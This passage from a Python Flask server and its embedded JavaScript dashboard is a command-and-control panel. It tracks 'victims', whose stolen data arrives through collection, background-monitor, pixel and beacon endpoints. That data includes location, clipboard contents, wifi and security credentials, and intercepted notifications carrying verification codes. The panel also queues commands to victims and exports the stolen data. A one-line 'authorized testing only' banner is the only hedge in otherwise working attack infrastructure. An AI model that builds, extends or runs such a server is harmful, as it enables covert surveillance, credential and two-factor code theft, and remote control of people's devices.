                option.textContent = `${victim.victim_id.substring(0, 20)}... (${victim.attack_type})`;
                select.appendChild(option);
            });
        }
        
        function generateAnalytics() {
            const container = document.getElementById('analytics-summary');
            
            if (!currentData.victims || currentData.victims.length === 0) {
                container.innerHTML = '<div style="text-align: center; padding: 40px; color: #666;">📊 No data for analytics</div>';
                return;
            }
            
            // Generate analytics summary
            const stats = {
                totalVictims: currentData.victims.length,
                attackTypes: [...new Set(currentData.victims.map(v => v.attack_type))].length,
                avgSessionTime: calculateAverageSessionTime(),
                topCountries: getTopCountries(),
                mostCommonOS: getMostCommonOS()
            };
            
            let html = `
                <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px;">
                    <div class="stat-box">
                        <div class="stat-number">${stats.totalVictims}</div>
                        <div class="stat-label">Total Victims</div>
                    </div>
                    <div class="stat-box">
                        <div class="stat-number">${stats.attackTypes}</div>
                        <div class="stat-label">Attack Types</div>
                    </div>
                    <div class="stat-box">
                        <div class="stat-number">${stats.avgSessionTime}m</div>
                        <div class="stat-label">Avg Session</div>
                    </div>
                    <div class="stat-box">
                        <div class="stat-number">${stats.topCountries}</div>
                        <div class="stat-label">Top Country</div>
                    </div>
                </div>
            `;
            
            container.innerHTML = html;
        }
        
        // Utility functions
        function getDeviceType(userAgent) {
            if (userAgent.includes('iPhone')) return '📱 iPhone';
            if (userAgent.includes('iPad')) return '📱 iPad';
            if (userAgent.includes('Android')) return '📱 Android';
            if (userAgent.includes('Windows')) return '💻 Windows';
            if (userAgent.includes('Mac')) return '💻 Mac';
            return '❓ Unknown';
        }
        
        function formatTime(seconds) {
            if (seconds < 60) return `${seconds}s`;
            if (seconds < 3600) return `${Math.floor(seconds/60)}m`;
            if (seconds < 86400) return `${Math.floor(seconds/3600)}h`;
            return `${Math.floor(seconds/86400)}d`;
        }
        
        function getDataTypeIcon(dataType) {
            const icons = {
                'device_fingerprint': '📱',
                'location_data': '📍',
                'clipboard_data': '📋',
                'permission_granted': '🔐',
                'background_monitor': '📡',
                'wifi_credentials': '📶',
                'security_credentials': '🔒'
            };
            return icons[dataType] || '📄';
        }
        
        // Action functions
        function viewVictim(victimId) {
            fetch(`/api/victim/${victimId}/details`)
                .then(response => response.json())
                .then(data => {
                    document.getElementById('modal-title').textContent = `🎯 Victim: ${victimId.substring(0, 20)}...`;
                    
                    let html = `
                        <div class="export-section">
                            <h3>📋 Basic Information</h3>
                            <div><strong>ID:</strong> ${data.victim.victim_id}</div>
                            <div><strong>Attack Type:</strong> ${data.victim.attack_type}</div>
                            <div><strong>IP Address:</strong> ${data.victim.ip_address}</div>
                            <div><strong>User Agent:</strong> ${data.victim.user_agent}</div>
                            <div><strong>First Seen:</strong> ${new Date(data.victim.first_seen).toLocaleString()}</div>
                            <div><strong>Last Seen:</strong> ${new Date(data.victim.last_seen).toLocaleString()}</div>
                        </div>
                        
                        <div class="export-section">
                            <h3>📊 Collected Data (${data.dataPoints.length} items)</h3>
                            <div class="json-display">${JSON.stringify(data.dataPoints, null, 2)}</div>
                        </div>
                    `;
                    
                    document.getElementById('modal-content').innerHTML = html;
                    document.getElementById('victimModal').style.display = 'block';
                })
                .catch(error => {
                    console.error('Error loading victim details:', error);
                });
        }
        
        function sendCommand() {
            const victimId = document.getElementById('command-victim').value;
            const commandType = document.getElementById('command-type').value;
            
            if (!victimId || !commandType) {
                alert('Please select victim and command type');
                return;
            }
            
            fetch('/api/send-command', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    victim_id: victimId,
                    command_type: commandType
                })
            })
            .then(response => response.json())
            .then(data => {
                alert(`Command sent successfully! ID: ${data.command_id}`);
                loadCommandsData(); // Refresh command history
            })
            .catch(error => {
                console.error('Error sending command:', error);
                alert('Failed to send command');
            });
        }
        
        function exportData(type) {
            const url = `/api/export/${type}`;
            window.open(url, '_blank');
        }
        
        function clearAllData() {
            if (confirm('⚠️ This will delete ALL victim data. Are you sure?')) {
                fetch('/api/clear-data', { method: 'POST' })
                    .then(response => response.json())
                    .then(data => {
                        alert('All data cleared successfully');
                        refreshAllData();
                    })
                    .catch(error => {
                        console.error('Error clearing data:', error);
                        alert('Failed to clear data');
                    });
            }
        }
        
        function openMaps(lat, lng) {
            const url = `https://www.google.com/maps?q=${lat},${lng}`;
            window.open(url, '_blank');
        }
        
        function closeModal() {
            document.getElementById('victimModal').style.display = 'none';
        }
        
        // Helper functions
        function calculateAverageSessionTime() {
            // Calculate based on first seen vs last seen
            if (!currentData.victims.length) return 0;
            
            const totalTime = currentData.victims.reduce((acc, victim) => {
                const duration = new Date(victim.last_seen) - new Date(victim.first_seen);
                return acc + (duration / 1000 / 60); // Convert to minutes
            }, 0);
            
            return Math.round(totalTime / currentData.victims.length);
        }
        
        function getTopCountries() {
            // Simplified - would need IP geolocation in real implementation
            return 'US';
        }
        
        function getMostCommonOS() {
            if (!currentData.victims.length) return 'Unknown';
            
            const osCounts = {};
            currentData.victims.forEach(victim => {
                const ua = victim.user_agent || '';
                let os = 'Unknown';
                if (ua.includes('Windows')) os = 'Windows';
                else if (ua.includes('Android')) os = 'Android';
                else if (ua.includes('iPhone')) os = 'iOS';
                else if (ua.includes('Mac')) os = 'macOS';
                
                osCounts[os] = (osCounts[os] || 0) + 1;
            });
            
            return Object.keys(osCounts).reduce((a, b) => osCounts[a] > osCounts[b] ? a : b);
        }
        
        // Auto-refresh functionality
        function startAutoRefresh() {
            if (refreshTimer) clearInterval(refreshTimer);
            
            refreshTimer = setInterval(() => {
                if (autoRefreshEnabled) {
                    refreshAllData();
                }
            }, refreshInterval);
        }
        
        function toggleAutoRefresh() {
            autoRefreshEnabled = document.getElementById('auto-refresh').checked;
            document.getElementById('auto-refresh-status').textContent = autoRefreshEnabled ? 'ON' : 'OFF';
            
            if (autoRefreshEnabled) {
                startAutoRefresh();
            } else {
                if (refreshTimer) clearInterval(refreshTimer);
            }
        }
        
        // Initialize dashboard
        window.addEventListener('load', function() {
            refreshAllData();
            startAutoRefresh();
            
            // Update uptime display
            const startTime = Date.now();
            setInterval(() => {
                const uptimeSeconds = Math.floor((Date.now() - startTime) / 1000);
                const uptimeHours = Math.floor(uptimeSeconds / 3600);
                const uptimeMinutes = Math.floor((uptimeSeconds % 3600) / 60);
                document.getElementById('uptime').textContent = `${uptimeHours}h ${uptimeMinutes}m`;
                document.getElementById('server-uptime').textContent = `${uptimeHours}h ${uptimeMinutes}m`;
            }, 60000);
            
            console.log('🎯 Advanced C&C Dashboard loaded successfully');
        });
        
        // Filter functions (implement as needed)
        function filterVictims() { /* TODO */ }
        function filterData() { /* TODO */ }
        function filterTimeline() { /* TODO */ }
    </script>
</body>
</html>
    '''
    return dashboard_html

# Enhanced API endpoints
@app.route('/api/dashboard-data')
def api_dashboard_data():
    """Comprehensive dashboard data endpoint"""
    try:
        conn = sqlite3.connect(DATABASE)
        cursor = conn.cursor()
        
        # Get victim statistics
        cursor.execute('SELECT COUNT(*) FROM victims')
        total_victims = cursor.fetchone()[0] or 0
        
        five_minutes_ago = datetime.now() - timedelta(minutes=5)
        cursor.execute('SELECT COUNT(*) FROM victims WHERE last_seen > ?', (five_minutes_ago,))
        online_victims = cursor.fetchone()[0] or 0
        
        cursor.execute('SELECT COUNT(*) FROM collected_data')
        total_data = cursor.fetchone()[0] or 0
        
        cursor.execute('SELECT COUNT(*) FROM collected_data WHERE severity = "high"')
        high_severity = cursor.fetchone()[0] or 0
        
        cursor.execute('SELECT COUNT(DISTINCT attack_type) FROM victims')
        attack_types = cursor.fetchone()[0] or 0
        
        # Get victims with enhanced data
        cursor.execute('''
            SELECT victim_id, attack_type, ip_address, last_seen, user_agent, 
                   status, location_lat, location_lng, device_info, permissions_granted,
                   first_seen
            FROM victims 
            ORDER BY last_seen DESC 
            LIMIT 100
        ''')
        
        victims = []
        for row in cursor.fetchall():
            victims.append({
                'victim_id': row[0],
                'attack_type': row[1],
                'ip_address': row[2],
                'last_seen': row[3],
                'user_agent': row[4],
                'status': row[5],
                'location_lat': row[6],
                'location_lng': row[7],
                'device_info': row[8],
                'permissions_granted': row[9],
                'first_seen': row[10]
            })
        
        # Get recent data points
        cursor.execute('''
            SELECT id, victim_id, data_type, data_content, timestamp, 
                   source_url, severity, tags
            FROM collected_data 
            ORDER BY timestamp DESC 
            LIMIT 200
        ''')
        
        data_points = []
        for row in cursor.fetchall():
            data_points.append({
                'id': row[0],
                'victim_id': row[1],
                'data_type': row[2],
                'data_content': row[3],
                'timestamp': row[4],
                'source_url': row[5],
                'severity': row[6],
                'tags': row[7]
            })
        
        # Get recent notifications
        cursor.execute('''
            SELECT id, victim_id, platform, category, title, body, 
                   notification_data, analysis_data, risk_level, timestamp
            FROM notifications 
            ORDER BY timestamp DESC 
            LIMIT 100
        ''')
        
        notifications = []
        for row in cursor.fetchall():
            notifications.append({
                'id': row[0],
                'victim_id': row[1],
                'platform': row[2],
                'category': row[3],
                'title': row[4],
                'body': row[5],
                'notification': json.loads(row[6]) if row[6] else {},
                'analysis': json.loads(row[7]) if row[7] else {},
                'risk_level': row[8],
                'timestamp': row[9]
            })
        
        conn.close()
        
        return jsonify({
            'stats': {
                'total_victims': total_victims,
                'online_victims': online_victims,
                'total_data': total_data,
                'high_severity': high_severity,
                'attack_types': attack_types
            },
            'victims': victims,
            'dataPoints': data_points,
            'notifications': notifications
        })
        
    except Exception as e:
        log_activity(f"❌ Error in api_dashboard_data: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/victim/<victim_id>/details')
def api_victim_details(victim_id):
    """Get detailed victim information"""
    try:
        conn = sqlite3.connect(DATABASE)
        cursor = conn.cursor()
        
        # Get victim info
        cursor.execute('SELECT * FROM victims WHERE victim_id = ?', (victim_id,))
        victim_row = cursor.fetchone()
        
        if not victim_row:
            return jsonify({'error': 'Victim not found'}), 404
        
        # Get all data points for this victim
        cursor.execute('''
            SELECT * FROM collected_data 
            WHERE victim_id = ? 
            ORDER BY timestamp DESC
        ''', (victim_id,))
        data_rows = cursor.fetchall()
        
        conn.close()
        
        # Format victim data
        victim = {
            'victim_id': victim_row[1],
            'session_id': victim_row[2],
            'first_seen': victim_row[3],
            'last_seen': victim_row[4],
            'user_agent': victim_row[5],
            'ip_address': victim_row[6],
            'attack_type': victim_row[7],
            'status': victim_row[8],
            'location_lat': victim_row[9],
            'location_lng': victim_row[10],
            'device_info': victim_row[11],
            'permissions_granted': victim_row[12]
        }
        
        # Format data points
        data_points = []
        for row in data_rows:
            data_points.append({
                'id': row[0],
                'data_type': row[2],
                'data_content': json.loads(row[3]) if row[3] else {},
                'timestamp': row[4],
                'source_url': row[5],
                'severity': row[6]
            })
        
        return jsonify({
            'victim': victim,
            'dataPoints': data_points
        })
        
    except Exception as e:
        log_activity(f"❌ Error in api_victim_details: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/send-command', methods=['POST'])
def api_send_command():
    """Send command to victim"""
    try:
        data = request.get_json()
        victim_id = data.get('victim_id')
        command_type = data.get('command_type')
        
        conn = sqlite3.connect(DATABASE)
        cursor = conn.cursor()
        
        cursor.execute('''
            INSERT INTO commands (victim_id, command_type, command_data)
            VALUES (?, ?, ?)
        ''', (victim_id, command_type, json.dumps(data)))
        
        command_id = cursor.lastrowid
        conn.commit()
        conn.close()
        
        log_activity(f"📤 Command '{command_type}' sent to {victim_id[:12]}...")
        
        return jsonify({
            'status': 'success',
            'command_id': command_id,
            'message': f'Command {command_type} sent to victim'
        })
        
    except Exception as e:
        log_activity(f"❌ Error in api_send_command: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/export/<export_type>')
def api_export(export_type):
    """Export data in various formats"""
    try:
        conn = sqlite3.connect(DATABASE)
        
        if export_type == 'victims':
            cursor = conn.cursor()
            cursor.execute('SELECT * FROM victims')
            data = cursor.fetchall()
            
            # Create CSV
            output = io.StringIO()
            writer = csv.writer(output)
            writer.writerow(['ID', 'Victim ID', 'Session ID', 'First Seen', 'Last Seen', 
                           'User Agent', 'IP Address', 'Attack Type', 'Status'])
            writer.writerows(data)
            
            # Return as file download
            response = app.response_class(
                output.getvalue(),
                mimetype='text/csv',
                headers={'Content-Disposition': 'attachment; filename=victims.csv'}
            )
            conn.close()
            return response
            
        elif export_type == 'data':
            cursor = conn.cursor()
            cursor.execute('SELECT * FROM collected_data')
            data = cursor.fetchall()
            
            # Convert to JSON format
            json_data = []
            for row in data:
                json_data.append({
                    'id': row[0],
                    'victim_id': row[1],
                    'data_type': row[2],
                    'data_content': row[3],
                    'timestamp': row[4],
                    'source_url': row[5],
                    'severity': row[6]
                })
            
            response = app.response_class(
                json.dumps(json_data, indent=2),
                mimetype='application/json',
                headers={'Content-Disposition': 'attachment; filename=collected_data.json'}
            )
            conn.close()
            return response
            
        else:
            return jsonify({'error': 'Invalid export type'}), 400
            
    except Exception as e:
        log_activity(f"❌ Error in api_export: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/test-notification-capture', methods=['POST'])
def api_test_notification_capture():
    """Test notification capture functionality"""
    try:
        data = request.get_json()
        victim_id = data.get('victim_id', 'test_notification_' + str(int(time.time())))
        
        # Create test notifications
        test_notifications = [
            {
                'type': 'notification_intercepted',
                'notification': {
                    'title': 'WhatsApp',
                    'body': 'John: Your verification code is 123456',
                    'icon': '/whatsapp-icon.png'
                },
                'analysis': {
                    'platform': 'whatsapp',
                    'category': 'messaging',
                    'riskLevel': 'high',
                    'sensitiveData': [
                        {'type': 'verification_code', 'value': '123456'}
                    ]
                },
                'victim_id': victim_id,
                'timestamp': time.time() * 1000
            },
            {
                'type': 'notification_intercepted',
                'notification': {
                    'title': 'Bank of America',
                    'body': 'Security Alert: Login from new device',
                    'icon': '/bank-icon.png'
                },
                'analysis': {
                    'platform': 'banking',
                    'category': 'financial',
                    'riskLevel': 'high',
                    'sensitiveData': []
                },
                'victim_id': victim_id,
                'timestamp': time.time() * 1000 + 1000
            },
            {
                'type': 'notification_intercepted',
                'notification': {
                    'title': 'Instagram',
                    'body': 'sarah_jones liked your photo',
                    'icon': '/instagram-icon.png'
                },
                'analysis': {
                    'platform': 'instagram',
                    'category': 'social',
                    'riskLevel': 'low',
                    'sensitiveData': []
                },
                'victim_id': victim_id,
                'timestamp': time.time() * 1000 + 2000
            }
        ]
        
        # Store test notifications
        for notification in test_notifications:
            store_victim_data(
                victim_id, 
                'notification_intercepted', 
                notification, 
                'test_notification_capture', 
                request.remote_addr, 
                'Test Agent', 
                'notification_test'
            )
        
        log_activity(f"🧪 Test notification capture executed for {victim_id}")
        
        return jsonify({
            'status': 'success',
            'message': 'Test notifications generated',
            'victim_id': victim_id,
            'notifications_created': len(test_notifications)
        })
        
    except Exception as e:
        log_activity(f"❌ Error in test notification capture: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/notification/<int:notification_id>/details')
def api_notification_details(notification_id):
    """Get detailed notification information"""
    try:
        conn = sqlite3.connect(DATABASE)
        cursor = conn.cursor()
        
        cursor.execute('''
            SELECT * FROM notifications WHERE id = ?
        ''', (notification_id,))
        
        notification_row = cursor.fetchone()
        
        if not notification_row:
            return jsonify({'error': 'Notification not found'}), 404
        
        conn.close()
        
        # Format notification data
        notification = {
            'id': notification_row[0],
            'victim_id': notification_row[1],
            'platform': notification_row[2],
            'category': notification_row[3],
            'title': notification_row[4],
            'body': notification_row[5],
            'notification': json.loads(notification_row[6]) if notification_row[6] else {},
            'analysis': json.loads(notification_row[7]) if notification_row[7] else {},
            'risk_level': notification_row[8],
            'sensitive_data': json.loads(notification_row[9]) if notification_row[9] else [],
            'timestamp': notification_row[10]
        }
        
        return jsonify(notification)
        
    except Exception as e:
        log_activity(f"❌ Error in api_notification_details: {e}")
        return jsonify({'error': str(e)}), 500
@app.route('/api/clear-data', methods=['POST'])

def api_clear_data():
    """Clear all data from database"""
    try:
        conn = sqlite3.connect(DATABASE)
        cursor = conn.cursor()
        
        cursor.execute('DELETE FROM collected_data')
        cursor.execute('DELETE FROM victims')
        cursor.execute('DELETE FROM commands')
        cursor.execute('DELETE FROM sessions')
        cursor.execute('DELETE FROM notifications')
        
        conn.commit()
        conn.close()
        
        log_activity("🗑️ All data cleared from database")
        
        return jsonify({'status': 'success', 'message': 'All data cleared'})
        
    except Exception as e:
        log_activity(f"❌ Error in api_clear_data: {e}")
        return jsonify({'error': str(e)}), 500

# Keep all the existing endpoints from the previous version
@app.route('/collect', methods=['POST', 'OPTIONS'])
def collect_data():
    """Main data collection endpoint with better error handling"""
    if request.method == 'OPTIONS':
        return '', 200
    
    try:
        data = request.get_json() or {}
        ip_address = request.environ.get('HTTP_X_FORWARDED_FOR', request.remote_addr)
        user_agent = request.headers.get('User-Agent', 'Unknown')
        
        victim_id = data.get('victim_id', f'unknown_{int(time.time())}')
        data_type = data.get('type', 'unknown')
        source_url = data.get('source_url', 'unknown')
        attack_type = data.get('attack_type', 'unknown')
        
        log_activity(f"📥 COLLECT: {data_type} from {victim_id[:12]}...", ip_address)
        
        success = store_victim_data(victim_id, data_type, data, source_url, ip_address, user_agent, attack_type)
        
        if success:
            return jsonify({'status': 'received', 'timestamp': datetime.now().isoformat()})
        else:
            return jsonify({'status': 'error', 'message': 'Database storage failed'}), 500
        
    except Exception as e:
        log_activity(f"❌ Error in collect_data: {e}")
        traceback.print_exc()
        return jsonify({'error': 'Internal server error', 'message': str(e)}), 500

@app.route('/monitor', methods=['POST', 'OPTIONS'])
def monitor_endpoint():
    """Background monitoring endpoint"""
    if request.method == 'OPTIONS':
        return '', 200
    
    try:
        data = request.get_json() or {}
        ip_address = request.environ.get('HTTP_X_FORWARDED_FOR', request.remote_addr)
        user_agent = request.headers.get('User-Agent', 'Unknown')
        
        victim_id = data.get('victim_id') or f'monitor_{ip_address}_{int(time.time())}'
        
        log_activity(f"📡 MONITOR: Background data from {victim_id[:12]}...", ip_address)
        
        store_victim_data(victim_id, 'background_monitor', data, 'service_worker', ip_address, user_agent, 'background')
        
        return jsonify({'status': 'monitored'})
        
    except Exception as e:
        log_activity(f"❌ Error in monitor_endpoint: {e}")
        return jsonify({'error': 'failed'}), 500

@app.route('/pixel.gif')
def pixel_beacon():
    """Image beacon endpoint"""
    try:
        encoded_data = request.args.get('d', '')
        ip_address = request.environ.get('HTTP_X_FORWARDED_FOR', request.remote_addr)
        
        if encoded_data:
            try:
                decoded_data = base64.b64decode(encoded_data).decode('utf-8')
                data = json.loads(decoded_data)
                victim_id = data.get('victim_id', f'pixel_{ip_address}')
                
                log_activity(f"🖼️ PIXEL: Image beacon from {victim_id[:12]}...", ip_address)
                store_victim_data(victim_id, 'pixel_beacon', data, 'image_beacon', ip_address, 'Image Beacon', 'pixel')
                
            except Exception as e:
                log_activity(f"❌ Error decoding pixel data: {e}")
        
        # Return 1x1 transparent GIF
        pixel_data = base64.b64decode('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7')
        return pixel_data, 200, {'Content-Type': 'image/gif'}
        
    except Exception as e:
        log_activity(f"❌ Error in pixel_beacon: {e}")
        return '', 500

@app.route('/beacon', methods=['POST'])
def beacon_endpoint():
    """Navigator.sendBeacon endpoint"""
    try:
        data = request.get_json() or json.loads(request.data.decode('utf-8'))
        ip_address = request.environ.get('HTTP_X_FORWARDED_FOR', request.remote_addr)
        
        victim_id = data.get('victim_id', f'beacon_{ip_address}')
        log_activity(f"📡 BEACON: Navigator beacon from {victim_id[:12]}...", ip_address)
        
        store_victim_data(victim_id, 'beacon_data', data, 'navigator_beacon', ip_address, 'Navigator Beacon', 'beacon')
        
        return '', 204
        
    except Exception as e:
        log_activity(f"❌ Error in beacon_endpoint: {e}")
        return '', 500

@app.route('/api/victims')
def api_victims():
    """Legacy API endpoint for backward compatibility"""
    try:
        response_data = api_dashboard_data()
        dashboard_data = response_data.get_json()
        
        return jsonify({
            'total': dashboard_data['stats']['total_victims'],
            'online': dashboard_data['stats']['online_victims'],
            'data_points': dashboard_data['stats']['total_data'],
            'victims': dashboard_data['victims']
        })
        
    except Exception as e:
        log_activity(f"❌ Error in api_victims: {e}")
        return jsonify({
            'error': 'Database error', 
            'message': str(e),
            'total': 0, 
            'online': 0, 
            'data_points': 0, 
            'victims': []
        }), 500

@app.route('/victim/<victim_id>')
def victim_details(victim_id):
    """Detailed victim information page"""
    try:
        conn = sqlite3.connect(DATABASE)
        cursor = conn.cursor()
        
        cursor.execute('SELECT * FROM victims WHERE victim_id = ?', (victim_id,))
        victim = cursor.fetchone()
        
        if not victim:
            return f"<h1>Victim not found: {victim_id}</h1>", 404
        
        cursor.execute('''
            SELECT data_type, data_content, timestamp, source_url, severity
            FROM collected_data 
            WHERE victim_id = ? 
            ORDER BY timestamp DESC
        ''', (victim_id,))
        data_points = cursor.fetchall()
        
        conn.close()
        
        # Generate enhanced HTML report
        html = f'''
        <!DOCTYPE html>
        <html>
        <head>
            <title>🎯 Victim Analysis: {victim_id}</title>
            <style>
                body {{ font-family: 'Consolas', monospace; background: #0a0a0a; color: #00ff41; padding: 20px; }}
                .header {{ border: 2px solid #00ff41; padding: 20px; margin-bottom: 20px; border-radius: 10px; background: rgba(0, 255, 65, 0.1); }}
                .data-entry {{ background: #1a1a1a; border: 1px solid #333; padding: 15px; margin: 10px 0; border-radius: 5px; }}
                .timestamp {{ color: #888; font-size: 0.9em; }}
                .data-type {{ color: #ff6b6b; font-weight: bold; margin: 5px 0; }}
                .severity-high {{ color: #ff6b6b; font-weight: bold; }}
                .severity-medium {{ color: #ffaa00; }}
                .severity-low {{ color: #888; }}
                pre {{ background: #222; padding: 10px; border-radius: 5px; overflow-x: auto; color: #00ff41; }}
                button {{ background: #ff6b6b; color: #000; border: none; padding: 8px 15px; margin: 5px; cursor: pointer; border-radius: 5px; }}
                .back-btn {{ position: fixed; top: 20px; right: 20px; z-index: 1000; }}
                .info-grid {{ display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; margin: 20px 0; }}
                .info-box {{ background: rgba(0, 255, 65, 0.1); padding: 15px; border-radius: 10px; border: 1px solid #00ff41; }}
            </style>
        </head>
        <body>
            <div class="back-btn">
                <button onclick="window.close()">❌ Close</button>
                <button onclick="location.reload()">🔄 Refresh</button>
                <button onclick="exportVictimData()">💾 Export</button>
            </div>
            
            <div class="header">
                <h1>🎯 Advanced Victim Analysis Report</h1>
                <p><strong>Victim ID:</strong> {victim_id}</p>
                <div class="info-grid">
                    <div class="info-box">
                        <strong>Attack Type:</strong><br>{victim[7] if len(victim) > 7 else 'Unknown'}
                    </div>
                    <div class="info-box">
                        <strong>IP Address:</strong><br>{victim[6] if len(victim) > 6 else 'Unknown'}
                    </div>
                    <div class="info-box">
                        <strong>First Seen:</strong><br>{victim[3] if len(victim) > 3 else 'Unknown'}
                    </div>
                    <div class="info-box">
                        <strong>Last Activity:</strong><br>{victim[4] if len(victim) > 4 else 'Unknown'}
                    </div>
                    <div class="info-box">
                        <strong>Status:</strong><br>{victim[8] if len(victim) > 8 else 'Unknown'}
                    </div>
                    <div class="info-box">
                        <strong>Location:</strong><br>
                        {f"{victim[9]:.4f}, {victim[10]:.4f}" if len(victim) > 10 and victim[9] and victim[10] else "Unknown"}
                    </div>
                </div>
            </div>
            
            <h2>📊 Collected Data Points ({len(data_points)} total)</h2>
            <div style="margin: 15px 0;">
                <button onclick="filterBySeverity('high')" style="background: #ff6b6b;">High Severity</button>
                <button onclick="filterBySeverity('medium')" style="background: #ffaa00;">Medium Severity</button>
                <button onclick="filterBySeverity('low')" style="background: #888;">Low Severity</button>
                <button onclick="filterBySeverity('')" style="background: #00ff41;">Show All</button>
            </div>
        '''
        
        for i, data_point in enumerate(data_points):
            data_type, content, timestamp, source_url, severity = data_point
            try:
                formatted_content = json.dumps(json.loads(content), indent=2)
            except:
                formatted_content = str(content)
            
            html += f'''
            <div class="data-entry" data-severity="{severity}">
                <div style="display: flex; justify-content: space-between; align-items: center;">
                    <div class="timestamp">🕒 {timestamp}</div>
                    <div class="severity-{severity}">{severity.upper()} SEVERITY</div>
                </div>
                <div class="data-type">📋 {data_type.upper()}</div>
                <div>📍 Source: {source_url}</div>
                <details style="margin-top: 10px;">
                    <summary style="cursor: pointer; color: #00ff41;">👁️ View Data Content</summary>
                    <pre>{formatted_content}</pre>
                </details>
            </div>
            '''
        
        html += '''
            <script>
                function filterBySeverity(severity) {
                    const entries = document.querySelectorAll('.data-entry');
                    entries.forEach(entry => {
                        if (severity === '' || entry.dataset.severity === severity) {
                            entry.style.display = 'block';
                        } else {
                            entry.style.display = 'none';
                        }
                    });
                }
                
                function exportVictimData() {
                    const victimId = window.location.pathname.split('/').pop();
                    window.open('/api/export/victim/' + victimId, '_blank');
                }
            </script>
        </body>
        </html>
        '''
        
        return html
        
    except Exception as e:
        log_activity(f"❌ Error in victim_details: {e}")
        return f"<h1>Error loading victim details: {e}</h1>", 500

@app.route('/health')
def health_check():
    """Enhanced health check endpoint"""
    return jsonify({
        'status': 'healthy',
        'service': 'mobile-security-c2',
        'timestamp': datetime.now().isoformat(),
        'version': '2.0.0-advanced',
        'features': [
            'Advanced Dashboard',
            'Real-time Monitoring', 
            'Data Export',
            'Command & Control',
            'Geolocation Tracking',
            'Timeline Analysis'
        ]
    })

@app.route('/debug/db')
def debug_database():
    """Enhanced debug endpoint"""
    try:
        conn = sqlite3.connect(DATABASE)
        cursor = conn.cursor()
        
        # Check tables
        cursor.execute("SELECT name FROM sqlite_master WHERE type='table'")
        tables = cursor.fetchall()
        
        # Count records in each table
        counts = {}
        for table in tables:
            try:
                cursor.execute(f'SELECT COUNT(*) FROM {table[0]}')
                counts[table[0]] = cursor.fetchone()[0]
            except:
                counts[table[0]] = 'Error'
        
        # Get recent activity
        cursor.execute('SELECT data_type, COUNT(*) FROM collected_data GROUP BY data_type')
        data_types = dict(cursor.fetchall())
        
        cursor.execute('SELECT attack_type, COUNT(*) FROM victims GROUP BY attack_type')
        attack_types = dict(cursor.fetchall())
        
        conn.close()
        
        return jsonify({
            'database_file': DATABASE,
            'tables': [table[0] for table in tables],
            'record_counts': counts,
            'data_types': data_types,
            'attack_types': attack_types,
            'status': 'ok',
            'version': '2.0.0-advanced'
        })
        
    except Exception as e:
        return jsonify({
            'error': str(e),
            'status': 'error'
        }), 500

def print_startup_banner():
    """Enhanced startup banner"""
    print("=" * 70)
    print("🎯 ADVANCED MOBILE SECURITY C&C SERVER")
    print("=" * 70)
    print("🚅 Platform: Railway")
    print("📡 Status: ONLINE")
    print(f"🌐 Port: {PORT}")
    print("💾 Database: SQLite (Enhanced Schema)")
    print("🔧 Version: 2.0.0-advanced")
    print("=" * 70)
    print("🚀 NEW FEATURES:")
    print("  ✅ Advanced Dashboard with Multiple Views")
    print("  ✅ Real-time Victim Monitoring")
    print("  ✅ Geolocation Tracking & Mapping")
    print("  ✅ Timeline Analysis")
    print("  ✅ Command & Control System")
    print("  ✅ Data Export (CSV/JSON)")
    print("  ✅ Severity-based Data Classification")
    print("  ✅ Enhanced Victim Profiles")
    print("=" * 70)
    print("📱 Available Endpoints:")
    print("  GET  /              - Advanced Dashboard")
    print("  POST /collect       - Data Collection")
    print("  POST /monitor       - Background Monitoring")
    print("  GET  /api/dashboard-data - Dashboard Data")
    print("  GET  /api/victim/<id>/details - Victim Details")
    print("  POST /api/send-command - Send Commands")
    print("  GET  /api/export/<type> - Data Export")
    print("  GET  /health        - Health Check")
    print("  GET  /debug/db      - Database Debug")
    print("=" * 70)
    print("⚠️  FOR AUTHORIZED SECURITY TESTING ONLY")
    print("=" * 70)

if __name__ == '__main__':
    # Initialize enhanced database
    init_success = init_db()
    
    if not init_success:
        print("❌ Failed to initialize database, continuing anyway...")
    
    # Print startup banner
    print_startup_banner()
    
    # Start server
    app.run(
        host='0.0.0.0',
        port=PORT,
        debug=False,
        threaded=True
    )
